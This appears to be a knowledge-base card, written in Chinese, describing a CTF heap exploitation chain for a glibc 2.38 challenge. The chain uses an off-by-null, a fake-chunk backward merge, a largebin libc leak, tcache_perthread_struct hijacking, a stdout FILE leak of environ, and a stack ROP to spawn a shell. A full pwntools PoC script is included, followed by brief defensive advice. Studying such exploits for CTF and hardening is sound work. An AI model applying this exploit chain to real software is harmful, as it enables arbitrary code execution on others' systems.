---
id: binary-pwn-heap-glibc238-offby-null-largebin-tcache-perthread-stdout-stack-rop
title: glibc 2.38 off-by-null + largebin 泄露 + tcache_perthread_struct 劫持：伪 counts/entries 返回 stdout 做 IO leak，再投毒栈写 ROP
type: scenario
domain: binary
path: binary/pwn/heap
technique: glibc238-offby-null-largebin-tcache-perthread-stdout-stack-rop
aliases:
- glibc 2.38 off by null
- babyheap 2.38
- tcache_perthread_struct 劫持
- attack tcache struct
- stdout IO leak environ
- safe-linking tcache 投毒
- 高版本堆打栈
tags:
- pwn
- heap
- glibc238
- off-by-null
- largebin
- tcache-perthread
- io-leak
- stack-rop
- safe-linking
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V654
  verified_at: '2026-11-13T05:40:51+08:00'
  notes: 已对照原文与30图核对：banner明确glibc2.38、Partial RELRO、无seccomp、堆地址-0x2a0、read_libc补\x00 off-by-null(0x501→0x500)、fake chunk 0x1880向后合并(unsorted b2c0)、两个数组槽同指b6e0、largebin main_arena+1136泄libc(-0x1ff0f0-0x20)、safe-linking fd=(heap_base+0x10)^(heap_base>>12)、伪造counts[0x3f]=7/entries[0x3f]=stdout(结构偏移0x7e/0x278)、stdout 0xfbad1800 IO leak environ、第二次劫持entries[0x3f]=stack-0x8、栈ROP(ret/pop_rdi/bin_sh/system)与图23-29一致，图30 getshell。未验证点：PoC未本机复跑；glibc2.38为题目环境非受影响版本，未设versions；frontmatter无sources/source_url。
---

## 一句话结论

glibc 2.38（无 `__free_hook`/`__malloc_hook`、tcache fd 有 safe-linking）的堆题里，`read_libc` 写满 size 字节后固定补一个 `\x00` 形成 off-by-null，清掉下一块的 `PREV_INUSE`；以 chunk0 用户区伪造 0x1880 的 fake chunk，free 后向合并出大 unsorted 块并与仍被引用的 chunk 重叠。先用 largebin 泄露 libc，再把重叠块伪造成 0x410 chunk 并投毒到 `tcache_perthread_struct`，改写 counts/entries 让 `malloc` 直接返回 `stdout`，伪造 `_IO_FILE` 的 `_IO_write_base=_environ` 泄露栈地址；第二次劫持该结构把 entry 指向栈，`malloc` 返回栈地址写入 ROP，菜单退出时 getshell。

## 原理

- **off-by-null**：`read_libc(buf, size)` 循环读 size 个字节（遇换行提前结束），结束后无条件 `*(buf+i)=0`。当输入恰好写满 size 字节时，这个 NUL 落在下一块 size 的最低字节；对 0x420 的 chunk（size `0x421`）会把 `PREV_INUSE` 清掉且 size 仍合法（`0x420`）。
- **伪造 chunk 与向后合并**：在 chunk0 用户区起始处写入 fake chunk 头 `prev_size=0, size=0x1880, fd=bk=<堆上锚点>`；在被 free 的 chunk6 前 8 字节写 `prev_size=0x1880`，off-by-null 清其 `PREV_INUSE`。`free(chunk6)` 时 consolidate backward 回退 0x1880 到 fake chunk，并经 unlink 检查（fd/bk 需锚定到满足 `FD->bk==P && BK->fd==P` 的堆地址），得到一个覆盖中间多个 chunk 的大 unsorted 块。
- **重叠与 largebin 泄露**：从合并出的 unsorted 块切出 0x408/0x488 等块，使两个数组槽指向同一 chunk；释放其中一个再申请 0x498 把它推进 largebin，`show` 读 largebin 的 fd/bk（main_arena 指针）得 libc 基址。
- **tcache_perthread_struct 劫持**：利用重叠在可控位置伪造 0x410 chunk 头（`size=0x411`），fd 用 safe-linking 编码为 `(heap_base+0x10) ^ (chunk_addr>>12)`；两次 `malloc(0x408)`：第一次取走伪造块，第二次返回堆上的 `tcache_perthread_struct`。写入伪结构：`counts[0x3f]=7`、`entries[0x3f]=stdout`（0x410 对应 size index 0x3f，counts 在结构偏移 0x7e，entries 在 0x80+0x3f*8=0x278），于是后续 `malloc(0x408)` 会返回 `_IO_2_1_stdout_`。
- **stdout IO leak**：向 stdout 写入伪造的 `_IO_FILE`：`_flags=0xfbad1800`、`_IO_write_base=_environ`、`_IO_write_ptr=_environ+8` 等；下一次输出/flush 时 libc 会把 `_environ` 指向的栈内容当作缓冲区写出，从而泄露栈地址。
- **栈 ROP**：再次劫持 `tcache_perthread_struct`，把 `entries[0x3f]` 改成 `stack-0x8`；`malloc(0x408)` 返回栈地址后写入 `p64(0)+p64(ret)+p64(pop_rdi)+p64('/bin/sh')+p64(system)`，`exit` 菜单返回时触发 ROP。
- **为什么需要 tcache 结构而不是 hook**：2.34 起移除 `__free_hook`/`__malloc_hook`，2.32 起 tcache fd 加密；高版本常用“劫持 tcache_perthread_struct → 任意地址分配 → IO leak/FSOP/栈 ROP”的组合。

## 触发条件

- glibc 2.38（safe-linking、无 hook），Partial RELRO，未启用 seccomp。
- 程序启动时泄露 heap 地址（本例直接打印堆地址），可计算 safe-linking 编码与结构偏移。
- add 大小限制在 0x400~0x500（本例 1023 < size ≤ 1280），edit 按固定大小写且会补 `\x00`（off-by-null）。
- 有 show 可读块内容、delete 可释放，菜单循环支持退出触发 ROP。

## 利用步骤

1. **泄堆地址**：读取启动输出中的堆地址，按偏移算出 `heap_base`。
2. **布置假 chunk**：`add(0x418, p64(0)+p64(0x1880)+p64(anchor)+p64(anchor))`，再申请若干 0x408/0x418/0x4f8 块把目标块排好。
3. **off-by-null 合并**：`edit(5, 0x418, 'a'*0x410 + p64(0x1880))`，写满后补的 `\x00` 清 chunk6 的 `PREV_INUSE`；`delete(6)` 触发向后合并，得到覆盖 chunk0 用户区的 unsorted 块。
4. **制造重叠**：`add(0x408)`/`add(0x488)` 切割 unsorted，使两个槽指向同一 chunk。
5. **泄 libc**：`delete(其中一个)`、`add(0x498)` 推进 largebin，`show(重叠槽)` 读 main_arena 指针，算 libc 基址。
6. **第一次 tcache 结构劫持**：`edit` 重叠块伪造成 0x410 chunk，fd 写 safe-linking 后的 `heap_base+0x10`；两次 `add(0x408)` 让第二次返回 `tcache_perthread_struct`，写入伪 counts/entries（`counts[0x3f]=7`、`entries[0x3f]=stdout`）。
7. **IO leak**：下一次 `add(0x408)` 返回 stdout，写入 `_flags=0xfbad1800`、`_IO_write_base=_environ` 的伪 FILE；读取输出得到栈地址。
8. **第二次劫持 + ROP**：再次改写 tcache 结构 `entries[0x3f]=stack-0x8`，`add(0x408, rop)` 把 ROP 写到栈；菜单选退出，`ret` 链执行 `system('/bin/sh')`。

## PoC

```python
# 精简关键步骤（完整脚本见原文）
heap_base = int(r(14),16) - 0x2a0

add(0x418, p64(0)+p64(0x1880)+p64(heap_base+0x2c0)+p64(heap_base+0x2c0))
add(0x408,'aaaa'); add(0x408,'aaaa'); add(0x408,'aaaa')
add(0x418,'aaaa'); add(0x418,'aaaa')
add(0x4f8,'bbbb'); add(0x4f8,'bbbb')

edit(5, 0x418, 'a'*0x410 + p64(0x1880))   # 写 prev_size，补 \x00 清 PREV_INUSE
delete(6)                                  # 向后合并出大 unsorted

add(0x408,'cccc'); add(0x488,'cccc'); add(0x488,'cccc')
delete(8); add(0x498,'dddd')
show(1)
libc_base = u64(p.recv(6).ljust(8,'\x00')) - 0x1ff0f0 - 0x20
environ   = libc_base + libc.sym['_environ']
stdout    = libc_base + libc.sym['_IO_2_1_stdout_']

# 伪造 0x410 chunk，fd 投毒到 tcache_perthread_struct（safe-linking）
pl = 'a'*0x380 + p64(0) + p64(0x411) + p64((heap_base+0x10) ^ (heap_base>>12))
edit(9, 0x400, pl)

add(0x408,'aaaa')
# counts[0x3f]=7, entries[0x3f]=stdout
fake_tcache = p64(0x1) + p64(0)*14 + p64(0x0007000000000000) + p64(0)*0x3f + p64(stdout)
add(0x408, fake_tcache)

add(0x408,'aaaa')
# 伪 _IO_FILE：write_base = environ
pl = p64(0xfbad1800) + p64(0)*3 + p64(environ) + p64(environ+8)*4
add(0x408, pl)
ru('\n'); stack = u64(p.recvuntil('\x7f').ljust(8,'\x00')) - 0x120

# 第二次劫持：entries[0x3f] = stack-0x8
fake_tcache2 = p64(0x1) + p64(0)*14 + p64(0x0007000000000000) + p64(0)*0x3f + p64(stack-0x8)
edit(3, 0x408, fake_tcache2)

pop_rdi = libc_base + 0x28715
bin_sh  = next(libc.search(b'/bin/sh'))
system  = libc.sym['system']
ret     = libc_base + 0x26a3e
rop = p64(0) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
add(0x400, rop)
menu(5)   # 退出触发栈上 ROP
```

## 变体与关联

- **tcache 结构版本差异**：2.38 的 `tcache_perthread_struct` 为 64 个 counts（uint16）+ 64 个 entries；2.43 扩展到 76 个槽位，偏移需按版本调整。
- **IO leak 变体**：也可用 `_IO_2_1_stdout_` 的 `0xfbad1800` 技巧泄露 `_IO_list_all`/libc，或用 wide_data/FSOP（House of Apple2）在 exit 时执行。
- **收尾变体**：无 ROP 条件时可走 `setcontext` 迁栈、`_IO_wfile_jumps` 等；有 seccomp 时改 ORW。
- 关联卡片：[[binary-pwn-heap-glibc243-tcache-perthread-struct-hijack]]（同原语的高版本通用写法）、[[binary-pwn-heap-glibc235-tcache-counts-key-clear-environ-rop]]（counts 扩容 + environ ROP）、[[binary-pwn-heap-glibc235-offby-null-unlink-chunks-array-stack-rop]]（off-by-null + 全局数组 + 栈 ROP 的 2.35 版本）、[[binary-pwn-heap-house-of-botcake-second-poisoning-io-leak-freehook]]（stdout IO leak 的另一条路径）。

## 检测与防御

- **代码审计**：`read` 写满后补 `\x00` 是典型 off-by-null；长度应为 `size-1` 或使用 `malloc_usable_size` 校验，避免写到下一块 size。
- **高版本加固**：保持 glibc 更新（safe-linking、移除 hook 只是抬高门槛），开启 `glibc.malloc.tcache_count=0` 可关闭 tcache 降低此类攻击面；启用 ASLR/PIE/Full RELRO 并避免启动时泄露堆地址。
- **CTF 之外**：真实程序若打印堆/栈地址并存在单字节溢出，应按信息泄露 + 内存破坏组合评估；生产环境用 ASan/Valgrind 与 fuzzing 捕获。
